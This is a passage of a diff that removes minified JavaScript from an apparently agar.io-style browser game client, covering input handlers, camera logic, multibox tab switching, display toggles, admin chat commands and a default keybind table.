-                        if (!n.opened) return s.A.Xwi ? (this.game.Zaq(e) ? n.zGd = !0 : n.Fcz = !0, n.uTX = !0, void n.open(s.A.Xwi)) : (0, i.me)("Connect to a server in the server list.", 0, 2e3);
-                        if (n.connected) {
-                            if ($.MFe = performance.now(), x.A.set("activeTabContext", s.A.yNT = t), $.Zaq(e) && !$.Zaq(t) && !$.ycZ(t)) return this.Xiy();
-                            $.Zaq(t) || $.ycZ(t) || n.NTE(), x.A.get("rememberEjecting") || $.eWI[e].jjW(!1)
-                        } else(0, i.me)("Tab " + (1 + t) + " is still connecting, please wait.", 0, 1500)
-                    }
-                    jvz($) {
-                        let {
-                            x: e,
-                            y: t
-                        } = this.game.FLt.mouse, x = 0, s = null;
-                        return this.game.VTJ.sort(($, e) => $.size - e.size).forEach(i => {
-                            var {
-                                x: a,
-                                y: o
-                            } = i.position, a = a - e, o = o - t, a = n.RZ(n.tn(a * a + o * o)) - i.size;
-                            ($ ? a < x : a <= 0) && (x = $ ? a : i.size, s = i)
-                        }), s
-                    }
-                    toggleSkins($) {
-                        null == $ && ($ = !x.A.get("skinsEnabled")), x.A.set("skinsEnabled", $), this.game.FCi.AaG()
-                    }
-                    toggleNames($) {
-                        null == $ && ($ = !x.A.get("namesEnabled")), x.A.set("namesEnabled", $), this.game.FCi.AaG()
-                    }
-                    toggleMass($) {
-                        null == $ && ($ = !x.A.get("massEnabled")), x.A.set("massEnabled", $), this.game.FCi.AaG()
-                    }
-                    toggleFood($) {
-                        null == $ && ($ = !x.A.get("foodVisible")), x.A.set("foodVisible", $), this.game.scene.food.visible = $
-                    }
-                    toggleHud($) {
-                        null == $ && ($ = !x.A.get("showHud")), x.A.set("showHud", $)
-                    }
-                    toggleChat($) {
-                        null == $ && ($ = !x.A.get("showChat")), x.A.set("showChat", $);
-                        var e = this.game;
-                        e.running && e.emit("uEBHda", $)
-                    }
-                    toggleChatToast($) {
-                        void 0 === $ && ($ = !x.A.get("showChatToast")), x.A.set("showChatToast", $), this.game.running
-                    }
-                    selectPlayer() {
-                        var $ = this.jvz(!0);
-                        $?.pid && (this.game.Qve = $.pid)
-                    }
-                }
-            },
-            13711($, e, t) {
-                var x = t(95195),
-                    s = t(95514),
-                    i = t(19099),
-                    n = t(83529),
-                    a = t(74173),
-                    o = t(78225);
-                let r = !!localStorage.getItem("adminMode"),
-                    l = s.Uk.view;
-                new class {
-                    constructor() {
-                        this.pressed = new Set, this.eJy = $ => {
-                            ("" + $.target?.className).includes("message text") || $.preventDefault()
-                        }, this.PaK = $ => {
-                            x.A.Xrx || ($ = "MOUSE" + $.button, i.Ay.release($))
-                        }, this.OZK = $ => {
-                            if (!(x.A.Xrx || (e = $.target) instanceof HTMLInputElement || e instanceof HTMLSelectElement || e instanceof HTMLButtonElement || ("" + e.className).includes("message"))) {
-                                var e, t;
-                                if ($.preventDefault(), l.focus(), r && $.shiftKey && x.A.Qve && 0 === $.button) return {
-                                    x: e,
-                                    y: t
-                                } = x.A.FLt.mouse, void x.A.FLt.uot("/teleport " + x.A.Qve + " " + e + " " + t);
-                                x.A.Zaq(o.A.yNT) && 0 === $.button ? (t = x.A.kmM.jvz()) && x.A.kmM.Xiy(t.pid) : (t = "MOUSE" + $.button, i.Ay.press(t))
-                            }
-                        }, this.FJz = $ => {
-                            var e, t, $ = a.A.from($.clientX, $.clientY);
-                            n.A.get("mouseFreezeSoft") && x.A.FLt.mouse.frozen && ({
-                                x: e,
-                                y: t
-                            } = x.A.WAG, $.x === e && $.y === t || x.A.kmM.PFX(!1)), x.A.WAG.set($), x.A.fjG(null, n.A.get("switchControlMode") ? null : o.A.yNT)
-                        }, this.pqb = $ => {
-                            if (r && $.shiftKey) {
-                                let e = 0;
-                                $.detail ? e = $.detail / 3 : $.wheelDelta && (e = -($.wheelDelta / 120)), x.A.FLt.uot("/mass " + x.A.Qve + " " + (e < 0 ? "+" : "-") + "5000")
-                            } else x.A.kmM.zoom($)
-                        }, this.yAI = $ => {
-                            if (!($.target !== l && $.target !== document.body || $.target instanceof HTMLInputElement)) {
-                                var e = i.Ay.XRq($.code);
-                                if (!(this.pressed.has(e) || $.ctrlKey && "TAB" === e)) {
-                                    if (this.pressed.add(e), r && $.shiftKey) this.Wqm(e);
-                                    else switch (e) {
-                                        case "ESCAPE":
-                                            return void this.iqu();
-                                        case "ENTER":
-                                            return void x.A.emit("osKiSw");
-                                        default:
-                                            x.A.Xrx || i.Ay.press(e) && $.preventDefault()
-                                    }
-                                }
-                            }
-                        }, this.VbF = $ => {
-                            $ = i.Ay.XRq($.code), i.Ay.release($), this.pressed.delete($)
-                        }, this.yJd = () => {
-                            x.A.scene.idx()
-                        }, window.addEventListener("blur", () => this.pressed.clear());
-                        let $ = $ => ($.preventDefault(), $.returnValue = "Are you sure you want to close the page?");
-                        document.body.addEventListener("contextmenu", this.eJy), x.A.on("stopped", () => {
-                            window.removeEventListener("beforeunload", $, {
-                                capture: !0
-                            }), document.body.removeEventListener("mouseup", this.PaK), document.body.removeEventListener("mousedown", this.OZK), document.body.removeEventListener("mousemove", this.FJz), l.removeEventListener("wheel", this.pqb), document.body.removeEventListener("keydown", this.yAI), document.body.removeEventListener("keyup", this.VbF), window.removeEventListener("resize", this.yJd)
-                        }), x.A.on("started", () => {
-                            window.addEventListener("beforeunload", $, {
-                                capture: !0
-                            }), document.body.addEventListener("mouseup", this.PaK), document.body.addEventListener("mousedown", this.OZK), document.body.addEventListener("mousemove", this.FJz), l.addEventListener("wheel", this.pqb, {
-                                passive: !0
-                            }), document.body.addEventListener("keydown", this.yAI), document.body.addEventListener("keyup", this.VbF), window.addEventListener("resize", this.yJd)
-                        })
-                    }
-                    iqu() {
-                        if (x.A.replaying) this.pressed.clear(), x.A.stop(), x.A.FQe(!0);
-                        else {
-                            let $ = !0;
-                            x.A.xCd.forEach((e, t) => {
-                                x.A.triggerAutoRespawn(t), $ = !1
-                            }), $ && x.A.FQe()
-                        }
-                    }
-                    Wqm($) {
-                        var e, t;
-                        "V" === $ ? ({
-                            x: e,
-                            y: t
-                        } = x.A.FLt.mouse, x.A.FLt.uot("/virus " + e + " " + t)) : "F" === $ ? x.A.FLt.uot("/freeze " + x.A.Qve) : "D" === $ && x.A.FLt.uot("/ignoreBorders " + x.A.Qve)
-                    }
-                }
-            },
-            692($, e, t) {
-                t.d(e, {
-                    A: () => D
-                });
-                var x = t(78225),
-                    s = t(83529),
-                    i = t(95514),
-                    n = t(23059),
-                    a = t(58514),
-                    o = t(82196),
-                    r = t(74173),
-                    l = t(15308),
-                    c = t(24968),
-                    h = t(70679),
-                    A = t(97667),
-                    u = t(37921),
-                    d = t(35827),
-                    g = t(1786),
-                    m = t(61036),
-                    C = t(30847),
-                    p = t(97665),
-                    f = t(53967),
-                    _ = t(33656),
-                    w = t(8125),
-                    v = t(35963),
-                    b = t(63836),
-                    y = t(44895),
-                    e = t(37007),
-                    e = t.n(e),
-                    B = t(54603),
-                    F = t(77088);
-                let I = 0;
-                class D extends e() {
-                    get cellCount() {
-                        return this.TRu[x.A.yNT]
-                    }
-                    set Ifp($) {
-                        this.Ifps[x.A.yNT] = $
-                    }
-                    set Pzr($) {
-                        this.Pzrs[x.A.yNT] = $
-                    }
-                    constructor() {
-                        super(), this.running = !1, this.YqE = r.A.from(0, 0), this.scores = [0, 0], this.xmF = [0, 0], this.zfx = 30, this.renderer = i.Uk, this.kpA = new o.A, this.settings = s.A, this.fps = new c.A, this.state = x.A, this.eWI = [new u.A(this, I++), new u.A(this, I++)], this.kmM = new A.A(this), this.TRu = [0, 0], this.HsE = [new y.A, new y.A], this.WAG = r.A.from(), this.UJM = [], this.eWF = [], this.FCi = new d.A(this), this.Ifps = [0, 0], this.Pzrs = [NaN, NaN], this.gFX = [0, 0], this.xCd = [], this.flags = 0, this.hYE = [-1, -1], this.Xrx = !0, this.Ypz = v.A, this.cPi = new f.A, this.timing = {
-                            d: [0, 0],
-                            u: [0, 0],
-                            s: [0, 0],
-                            c: [0, 0]
-                        }, this.render = $ => {
-                            var e = this.GAB = performance.now();
-                            for (let t = 0; t < 2; t++) {
-                                var s = this.Pzrs[t];
-                                (isNaN(s) || e < s) && (this.Ifps[t] = 0, this.fjG(null, t))
-                            }
-                            this.wLz(e), this.aHs(e), this.scene.sort(), this.pWR(!1), x.A.rendering && i.Uk.render(this.scene.container), this.fps.update(this.ticker.FPS), this.frames++, this.frames % 10 == 0 && this.emit("DEPJkV")
-                        }, this.oiz = 0, n.Tb.load(s.A.get("virusImageUrl")), n.$P.load(s.A.get("arrowImageUrl"));
-                        var $ = [];
-                        $.push((0, C.yb)(() => this.emit("GzmcRb"), 1e3)), $.push((0, C.yb)(() => this.emit("kaczpN"), 6e4)), this.intervals = $, g.xx.ROS(this), g.kF.ROS(this), document.addEventListener("visibilitychange", () => {
-                            var $;
-                            this.running && ($ = "visible" === document.visibilityState, x.A.rendering = $, (0, l.$s)(0, (0, _.nC)($)), $ ? l.oR.close() : (0, l.me)(_.U7, 0))
-                        }), document.addEventListener("click", () => {
-                            this.running && (x.A.rendering = !0)
-                        }), x.A.yNT = s.A.get("activeTabContext"), s.A.on("zrVIMz", ($, e) => {
-                            "activeTabContext" === $ && this.jWf(0 === e ? 1 : 0, e)
-                        }), this.on("tPqeFj", ($, e) => {
-                            if (null == (e = e || x.A.Xwi))(0, l.$s)(1, _.C6), $.promise = Promise.resolve(!1);
-                            else {
-                                if (null != this.FAk) {
-                                    if (!$.first || x.A.Xwi === e) return $.wait = !0, void($.promise = Promise.resolve(!1));
-                                    (0, C.DJ)(this.FAk)
-                                }
-                                this.FAk = (0, C.wg)(() => {
-                                    delete this.FAk
-                                }, 3200), l.oR.close();
-                                let t;
-                                t = (t = $.first && (this.eWI.forEach($ => $.opened && $.close()), this.running) ? new Promise($ => {
-                                    this.once("stopped", () => $()), this.stop()
-                                }) : t) ?? Promise.resolve(), $.promise = new Promise(async $ => {
-                                    await t, s.A.get("joinTabsTogether") && (this.FLt.Jtp = !0, this.FLt.OIw = !0), $(await this.FLt.open(e))
-                                })
-                            }
-                        }), this.txC = D.OIT.bind(null, this)
-                    }
-                    start($) {
-                        if (!($.protocol && $.MXg && $.lrL && $.border)) throw Error(_.Ns);
-                        this.running = !0, this.protocol = $.protocol, this.PHu = $.PHu || 0, this.MXg = $.MXg, this.replaying = !1, this.flags = 0, this.hYE = [-1, -1], x.A.tXL = [!1, !1], this.lrL = $.lrL, this.tagId = null, this.YqE.reset(), this.scores = [0, 0], this.xmF = [0, 0], this.KRz = 0, this.GAB = 0, this.fps.reset(), h.Ab.clear(), h.DH.clear(), h.nf.clear(), this.HsE.forEach($ => $.clear()), this.TRu = [0, 0], this.WAG.reset(), this.Cwd = .3, this.jeQ = .01;
-                        var e = this.border = $.border;
-                        (0, b.yc)($.sizes, e), this.camera = {
-                            ohR: 0,
-                            IFG: [r.A.from(), r.A.from()],
-                            GqY: [r.A.from(), r.A.from()],
-                            Fql: r.A.from(e.x, e.y),
-                            WvL: r.A.from(),
-                            ytG: r.A.from(e.x, e.y),
-                            sbB: this.Cwd,
-                            vaS: this.Cwd
-                        }, this.UJM = [], this.eWF = [], this.scene = new a.A(this, e), this.FCi.reset(), this.ticker = new F.Rv, this.ticker.add(this.render), this.replaying || (this.Ifps = [0, 0], this.Pzrs = [NaN, NaN], s.A.get("minimapEnabled") && this.emit("OTySHI"), s.A.get("showMinimapStats") && this.emit("omMooP", !0), s.A.get("showChat") && this.emit("uEBHda", !0), this.emit("lnBlYR"), this.emit("uzPfcB", !0), w.pB.set((0, _.Rr)(1 + x.A.yNT)), w.qC.set(!0), w.m7.set(!0), this.on("GzmcRb", this.txC)), this.frames = 0, this.ticker.start(), this.emit("started")
-                    }
-                    stop() {
-                        if (this.running) {
-                            this.running = !1, delete this.protocol, delete this.PHu, delete this.MXg, delete this.replaying, delete this.lrL, delete this.tagId, x.A.reset(), w.m7.set(!0), w.pB.set((0, _.Rr)(1 + x.A.yNT)), w.qC.set(!0), x.A.tXL = [!1, !1], this.YqE.reset(), this.scores = [0, 0], this.xmF = [0, 0], this.KRz = 0, this.GAB = 0, this.bLD(0), this.bLD(1), this.TRu = [0, 0], this.WAG.reset(), delete this.Cwd, delete this.jeQ, delete this.border, delete this.camera, this.FCi.reset();
-                            var $ = this.scene;
-                            for ($ && ($.BdI(!1), $.Ahq(), $.container.destroy({
-                                    children: !0
-                                }), delete this.scene), this.renderer.clear(), n.lw.reset(), n.WK.reset(); this.UJM.length;) this.UJM.pop().destroy(!0);
-                            for (; this.eWF.length;) this.eWF.pop().destroy();
-                            this.ticker.stop(), delete this.ticker, delete this.frames, this.Ifps = [0, 0], this.Pzrs = [NaN, NaN], this.off("GzmcRb", this.txC), this.gFX = [0, 0], this.xCd = [], this.kpA.hha(), this.emit("omMooP", !1), this.emit("uzPfcB", !1), this.emit("IickcJ"), this.emit("uEBHda", !1), this.emit("EnBeEu"), this.emit("PSbuQD"), this.emit("dckXze", !1), this.emit("TNRyrb", 0), this.emit("degdLH"), this.emit("stopped")
-                        }
-                    }
-                    static OIT($) {
-                        var e, t, x;
-                        for (let s = 0; s < 2; s++) $.pEA(s) && ((e = $.eWI[s]).Iwi = e.BtR());
-                        $.pEA(0) && $.pEA(1) ? ([t, x] = $.hYE, $.emit("GfXwco", 80 < (x < t ? t - x : x - t))) : $.emit("GfXwco", !1)
-                    }
-                    FQe($) {
-                        void 0 === $ && ($ = !this.Xrx), this.Xrx !== $ && (this.Xrx = $), this.eWI.forEach(e => {
-                            e.mouse.centralize = $
-                        }), this.emit("RAwTus", {
-                            LZd: !0
-                        }), this.emit("Dcxyoc", $), $ || i.Uk.view.focus()
-                    }
-                    bLD($, e) {
-                        var t = h.Ab;
-                        let x;
-                        for (x of t.values()) x.EZD.disown($), 0 === x.EZD.size && (x.destroy(), t.delete(x.id));
-                        for (x of h.nf) x.LnE();
-                        if (h.nf.clear(), e)
-                            for (x of h.DH) x.EZD.disown($)
-                    }
-                    triggerAutoRespawn($) {
-                        (0, C.DJ)(this.xCd[$]), delete this.xCd[$], x.A.zCS[$] = !1, delete this.gFX[$], this.Xrx || this.Zaq($) || this.VTJ.some(e => e.pid === x.A.pids[$]) || this.eWI[$].NTE()
-                    }
-                    AUn($) {
-                        (0, C.DJ)(this.xCd[$]), delete this.xCd[$], x.A.zCS[$] = !1
-                    }
-                    wLz($) {
-                        for (var e, t = h.nf.values(), x = t.length; x--;)(e = t[x]).update($) && (h.nf.delete(e), e.LnE())
-                    }
-                    aHs($) {
-                        for (var e = h.DH.values(), t = e.length; t--;) e[t].update($)
-                    }
-                    ZAg($) {
-                        var e = r.A.from();
-                        if (this.ycZ($)) {
-                            let t = 0,
-                                x = 0,
-                                s = 0,
-                                i;
-                            for (i of this.HsE[$]) {
-                                var {
-                                    x: n,
-                                    y: a
-                                } = i.ytG, o = i.mass;
-                                x += n * o, s += a * o, t += o
-                            }
-                            0 !== t && e.set(x / t, s / t)
-                        }
-                        return e
-                    }
-                    nFh($) {
-                        if (!this.ycZ($)) return -1;
-                        var e = this.ZAg(0 === $ ? 1 : 0);
-                        if (!e.abB()) return -1;
-                        let t = 1 / 0,
-                            x;
-                        for (x of this.HsE[$]) {
-                            var s = m.RZ(m.tn((0, p.Sl)(x.position, e))) - x.dxt;
-                            s < t && (t = s)
-                        }
-                        return t !== 1 / 0 ? m.tn(t) : -1
-                    }
-                    pWR($) {
-                        var e = this.camera,
-                            t = this.GAB - e.ohR,
-                            i = void 0 !== this.MFe && 200 > m.tn(this.GAB - this.MFe) ? s.A.get("cameraSwitchDelay") : s.A.get("cameraMoveDelay"),
-                            n = (void 0 !== this.MFe && i === s.A.get("cameraMoveDelay") && delete this.MFe, (0, l.N)(t / s.A.get("cameraZoomDelay"), 0, 1)),
-                            t = (0, l.N)(t / i, 0, 1),
-                            i = this.scene.container,
-                            t = e.WvL.set(e.Fql).lerp(e.ytG, t),
-                            n = (i.pivot.set(t.x, t.y), (0, l.Cc)(e.sbB, e.vaS, n)),
-                            i = (i.scale.set(n), x.A.yNT),
-                            [i, a] = s.A.get("useSharedViewport") && 2 === this.oiz ? this.Bum(i) : this.Wgn(i);
-                        $ && (e.ytG.set(i), e.vaS = a, e.Fql.set(t), e.sbB = n, e.ohR = this.GAB)
-                    }
-                    Wgn($) {
-                        let e = this.Cwd;
-                        if (this.Zaq($)) return [this.camera.IFG[$], e];
-                        var t = this.YqE.reset(),
-                            x = this.HsE[$];
-                        if (0 === x.size) return [this.camera.GqY[$], e];
-                        let i = 0,
-                            n = 0,
-                            a = 0,
-                            o = 0,
-                            r;
-                        for (r of x) {
-                            var l = r.mass,
-                                {
-                                    x: c,
-                                    y: h
-                                } = (n += l, r.ytG);
-                            a += c * l, o += h * l, i += r.dxt
-                        }
-                        return 0 !== n && t.set(a / n, o / n), s.A.get("autoZoom") && (e *= m.n7(m.jk(64 / i, 1), .22)), this.camera.GqY[$].set(t), [t, e]
-                    }
-                    Bum($) {
-                        let e = this.Cwd;
-                        if (this.Zaq($)) return [this.camera.IFG[$], e];
-                        var t = this.YqE.reset();
-                        if (0 === this.HsE[$].size) return [this.camera.GqY[$], e];
-                        var x = this.nFh($),
-                            x = x <= 0 || x > s.A.get("sharedViewportMaxDistance");
-                        if (x) return this.Wgn($);
-                        let i = 0,
-                            n = 0,
-                            a = 0,
-                            o = 0,
-                            r;
-                        for (r of this.HsE.flatMap($ => $.values())) {
-                            var l = r.mass,
-                                {
-                                    x: c,
-                                    y: h
-                                } = (n += l, r.ytG);
-                            a += c * l, o += h * l, i += r.dxt
-                        }
-                        return 0 !== n && t.set(a / n, o / n), s.A.get("autoZoom") && (e *= m.n7(m.jk(64 / i, 1), x ? .22 : .17)), this.camera.GqY[$].set(t), [t, e]
-                    }
-                    fjG($, e = x.A.yNT) {
-                        var t;
-                        let i = this.scene.container,
-                            {
-                                x: n,
-                                y: a
-                            } = this.WAG;
-                        s.A.get("switchControlMode") ? this.eWI.forEach(t => {
-                            if (t.connected) {
-                                var x = t.mouse;
-                                if (x.frozen) {
-                                    if (null == $ || $ !== t.context) return
-                                } else if (null != e && e !== t.context) return;
-                                x.set((0, l.N)(i.pivot.x + (n - window.innerWidth / 2) / i.scale.x, -32768, 32767), (0, l.N)(i.pivot.y + (a - window.innerHeight / 2) / i.scale.y, -32768, 32767))
-                            }
-                        }) : (t = this.FLt).mouse.frozen && (null == $ || $ !== t.context) || this.FLt.mouse.set((0, l.N)(i.pivot.x + (n - window.innerWidth / 2) / i.scale.x, -32768, 32767), (0, l.N)(i.pivot.y + (a - window.innerHeight / 2) / i.scale.y, -32768, 32767))
-                    }
-                    MOW($) {
-                        return ($ = m.F8($) * (1e4 + this.MXg)) - m.RI($)
-                    }
-                    Hdd($) {
-                        return !s.A.get("shortMass") || $ < 1e3 ? $.toFixed(0) : 1e6 <= $ ? +($ / 1e6).toFixed(1) + "m" : +($ / 1e3).toFixed(1) + "k"
-                    }
-                    jWf($, e) {
-                        var t = s.A.get("tabStatusMode");
-                        if (0 === t) {
-                            var x = this.FCi.ZRd($),
-                                i = this.FCi.ZRd(e);
-                            i && x && x.rAX(s.A.get("switchUnfocusedColor")), i && i.rAX(s.A.get("switchFocusedColor"))
-                        } else if (1 === t) {
-                            let n = this.HsE[$],
-                                a;
-                            for (a of n) a.VEj && a.IvE();
-                            for (a of n = this.HsE[e]) a.VEj || a.qLx()
-                        }
-                    }
-                    ycZ($) {
-                        return Boolean(this.flags & (0 == $ ? 2 : 4))
-                    }
-                    DMs($, e) {
-                        this.ycZ($) != e && ($ = 0 === $ ? 2 : 4, e ? this.flags |= $ : this.flags &= ~$, (0, B.Jt)(w.m7) == e) && w.m7.set(!e)
-                    }
-                    get alive() {
-                        return Boolean(2 & this.flags) || Boolean(4 & this.flags)
-                    }
-                    Zaq($) {
-                        return Boolean(this.flags & (0 == $ ? 8 : 16))
-                    }
-                    fwE($, e) {
-                        this.Zaq($) != e && ($ = 0 === $ ? 8 : 16, e ? this.flags |= $ : this.flags &= ~$)
-                    }
-                    pEA($) {
-                        return ($ = this.eWI[$]).opened && $.connected
-                    }
-                    get connected() {
-                        return this.eWI.some($ => $.connected)
-                    }
-                    get Xmo() {
-                        return Boolean(8 & this.flags) || !!(16 & this.flags)
-                    }
-                    get SAd() {
-                        return x.A.pids[x.A.yNT]
-                    }
-                    get FLt() {
-                        return this.eWI[x.A.yNT]
-                    }
-                    jMz($) {
-                        let e = 0,
-                            t;
-                        for (t of this.HsE[$]) e += t.mass;
-                        return e
-                    }
-                    get YIr() {
-                        var $;
-                        let e = 0;
-                        return this.HsE.forEach(t => {
-                            for ($ of t) e += $.mass
-                        }), e
-                    }
-                    get score() {
-                        return this.scores[x.A.yNT]
-                    }
-                    get fIW() {
-                        return this.xmF[x.A.yNT]
-                    }
-                    get cells() {
-                        return Array.from(h.DH.values())
-                    }
-                    get VTJ() {
-                        return this.cells.filter($ => $.exG).map($ => $)
-                    }
-                    get Jpt() {
-                        return h.nf.values()
-                    }
-                }
-            },
-            95195($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var e = t(692),
-                    x = t(15308),
-                    s = t(33656),
-                    e = new e.A;
-                (0, x.$s)(1, s.S6), t.g.gameObject = e;
-                let i = t.g.game = e
-            },
-            19099($, e, t) {
-                t.d(e, {
-                    A4: () => u,
-                    Ay: () => d,
-                    Mf: () => A
-                });
-                var x = t(95195),
-                    s = t(83529),
-                    i = t(78225),
-                    n = t(15308),
-                    a = t(8125),
-                    o = t(24216),
-                    r = t(33656),
-                    l = t(54603);
-                let c = new Map([
-                        ["toggleAutoRespawn", () => {
-                            var $ = s.A.get("autoRespawn");
-                            s.A.set("autoRespawn", !$), $ && i.A.zCS.forEach(($, e) => {
-                                $ && x.A.triggerAutoRespawn(e)
-                            }), n.oR.fire({
-                                title: (0, r.Tw)($),
-                                icon: "info",
-                                timer: 1500
-                            })
-                        }],
-                        ["saveReplay", () => {
-                            var $;
-                            x.A.Ypz.running ? ($ = x.A.Ypz.download(), x.A.Ypz.stop(), $.then($ => {
-                                (0, n.me)((0, r.bz)($), 0, 1500)
-                            })) : ((0, n.me)(r.w8, 0, 3e3), x.A.Ypz.start())
-                        }],
-                        ["respawn", () => {
-                            (0, l.Jt)(a.qC) && (x.A.kmM.Rhi(), x.A.Xrx) && x.A.FQe(!1)
-                        }],
-                        ["feed", x.A.kmM.feed.bind(x.A.kmM)],
-                        ["feedMacro", x.A.kmM.feed.bind(x.A.kmM, !0)],
-                        ["split", x.A.kmM.split.bind(x.A.kmM, 1)],
-                        ["splitx2", () => x.A.kmM.split(2, s.A.get("delayDoublesplit") ? 40 : 0)],
-                        ["splitx3", x.A.kmM.split.bind(x.A.kmM, 3)],
-                        ["splitMax", x.A.kmM.split.bind(x.A.kmM, 4)],
-                        ["split32", x.A.kmM.split.bind(x.A.kmM, 5)],
-                        ["split64", x.A.kmM.split.bind(x.A.kmM, 6)],
-                        ["split128", x.A.kmM.split.bind(x.A.kmM, 7)],
-                        ["split256", x.A.kmM.split.bind(x.A.kmM, 8)],
-                        ["linesplit", x.A.kmM.lineSplit.bind(x.A.kmM)],
-                        ["freezeMouse", x.A.kmM.PFX.bind(x.A.kmM)],
-                        ["lockLinesplit", x.A.kmM.OsW.bind(x.A.kmM)],
-                        ["stopMovement", x.A.kmM.KHK.bind(x.A.kmM)],
-                        ["toggleSkins", x.A.kmM.toggleSkins.bind(x.A.kmM)],
-                        ["toggleNames", x.A.kmM.toggleNames.bind(x.A.kmM)],
-                        ["toggleFood", x.A.kmM.toggleFood.bind(x.A.kmM)],
-                        ["toggleMass", x.A.kmM.toggleMass.bind(x.A.kmM)],
-                        ["toggleChat", x.A.kmM.toggleChat.bind(x.A.kmM)],
-                        ["toggleChatToast", x.A.kmM.toggleChatToast.bind(x.A.kmM)],
-                        ["toggleHud", x.A.kmM.toggleHud.bind(x.A.kmM)],
-                        ["spectateLock", x.A.kmM.TaP.bind(x.A.kmM)],
-                        ["selectPlayer", x.A.kmM.selectPlayer.bind(x.A.kmM)],
-                        ["zoomLevel1", x.A.kmM.Szi.bind(x.A.kmM, 1)],
-                        ["zoomLevel2", x.A.kmM.Szi.bind(x.A.kmM, 2)],
-                        ["zoomLevel3", x.A.kmM.Szi.bind(x.A.kmM, 3)],
-                        ["zoomLevel4", x.A.kmM.Szi.bind(x.A.kmM, 4)],
-                        ["zoomLevel5", x.A.kmM.Szi.bind(x.A.kmM, 5)],
-                        ["switchMultibox", x.A.kmM.RWX.bind(x.A.kmM)],
-                        ["switchSplit", () => {
-                            x.A.kmM.split(2), x.A.kmM.RWX(), x.A.kmM.split(8)
-                        }],
-                        ["switchLinesplit", () => {
-                            x.A.kmM.lineSplit(), x.A.kmM.RWX(), x.A.kmM.split(8)
-                        }],
-                        ["splitTrigger", () => {
-                            var $ = x.A.kmM.jvz(!0);
-                            return $ ? o.h.target && $.pid === o.h.target.pid ? o.h.reset() : void o.h.watch($.pid, 0) : o.h.target && o.h.reset()
-                        }],
-                        ["doublesplitTrigger", () => {
-                            var $ = x.A.kmM.jvz(!0);
-                            return $ ? o.h.target && $.pid === o.h.target.pid ? o.h.reset() : void o.h.watch($.pid, 1) : o.h.target && o.h.reset()
-                        }],
-                        ["linesplitTrigger", () => {
-                            var $ = x.A.kmM.jvz(!0);
-                            return $ ? o.h.target && $.pid === o.h.target.pid ? o.h.reset() : void o.h.watch($.pid, 2) : o.h.target && o.h.reset()
-                        }],
-                        ["tricksplitTrigger", () => {
-                            var $ = x.A.kmM.jvz(!0);
-                            return $ ? o.h.target && $.pid === o.h.target.pid ? o.h.reset() : void o.h.watch($.pid, 3) : o.h.target && o.h.reset()
-                        }],
-                        ["contextMenu", () => {
-                            var $ = x.A.kmM.jvz(!0);
-                            x.A.emit("WdtSom", $?.pid ? $.player : null, x.A.WAG.clone())
-                        }],
-                        ["lockMouse", () => {
-                            if (!x.A.Xmo) {
-                                var $, e, t, s = i.A.yNT,
-                                    n = i.A.pids[s],
-                                    a = x.A.eWI[i.A.yNT],
-                                    o = a.mouse,
-                                    r = !o.pause;
-                                if (r) {
-                                    let l = 0,
-                                        c, h, A;
-                                    for (A of x.A.HsE[s]) A.pid === n && (e = A.position, t = Math.hypot($ = o.x - e.x, e = o.y - e.y), (t = A.mass / t) > l) && (l = t, c = $, h = e);
-                                    0 !== l && (s = Math.atan2(h, c), o.x = o.x + 1e4 * Math.cos(s), o.y = o.y + 1e4 * Math.sin(s), a.CiT())
-                                }
-                                o.pause = r, x.A.emit("RAwTus", {
-                                    mouseFrozen: !0
-                                })
-                            }
-                        }],
-                        ["m-feed", () => {
-                            x.A.eWI[0 === i.A.yNT ? 1 : 0].jjW()
-                        }],
-                        ["m-feedMacro", () => {
-                            x.A.eWI[0 === i.A.yNT ? 1 : 0].jjW(!0)
-                        }],
-                        ["m-split", () => {
-                            x.A.kmM.split(1, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-splitx2", () => {
-                            x.A.kmM.split(2, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-splitx3", () => {
-                            x.A.kmM.split(3, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-splitMax", () => {
-                            x.A.kmM.split(4, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-split32", () => {
-                            x.A.kmM.split(5, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-split64", () => {
-                            x.A.kmM.split(6, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-split128", () => {
-                            x.A.kmM.split(7, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-split256", () => {
-                            x.A.kmM.split(8, null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-linesplit", () => {
-                            x.A.kmM.lineSplit(0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-freezeMouse", () => {
-                            x.A.kmM.PFX(null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-lockLinesplit", () => {
-                            x.A.kmM.OsW(null, 0 === i.A.yNT ? 1 : 0)
-                        }],
-                        ["m-respawn", () => {
-                            x.A.eWI[0 === i.A.yNT ? 1 : 0].NTE()
-                        }],
-                        ["m-stopMovement", () => {
-                            x.A.kmM.KHK(null, 0 === i.A.yNT ? 1 : 0)
-                        }]
-                    ]),
-                    h = {
-                        feed: "W",
-                        feedMacro: "MOUSE0",
-                        split: "SPACE",
-                        splitx2: "G",
-                        splitx3: "H",
-                        splitMax: "T",
-                        split32: "",
-                        split64: "",
-                        linesplit: "Z",
-                        freezeMouse: "",
-                        lockLinesplit: "",
-                        lockMouse: "",
-                        respawn: "",
-                        toggleAutoRespawn: "",
-                        stopMovement: "",
-                        toggleSkins: "",
-                        toggleNames: "",
-                        toggleMass: "",
-                        spectateLock: "Q",
-                        selectPlayer: "E",
-                        saveReplay: "R",
-                        toggleChat: "",
-                        toggleChatToast: "",
-                        toggleHud: "",
-                        zoomLevel1: "1",
-                        zoomLevel2: "2",
-                        zoomLevel3: "3",
-                        zoomLevel4: "4",
-                        zoomLevel5: "5",
-                        switchMultibox: "",
-                        switchSplit: "",
-                        switchLinesplit: "",
-                        doublesplitTrigger: "",
-                        linesplitTrigger: "",
-                        tricksplitTrigger: "",
-                        contextMenu: "MOUSE1",
-                        "m-split": "",
-                        "m-splitx2": "",
-                        "m-splitx3": "",
-                        "m-splitMax": "",
-                        "m-split32": "",
-                        "m-split64": "",
-                        "m-split128": "",
-                        "m-split256": "",
-                        "m-linesplit": "",
-                        "m-freezeMouse": "",
-                        "m-lockLinesplit": "",
-                        "m-respawn": "",
-                        "m-stopMovement": "",
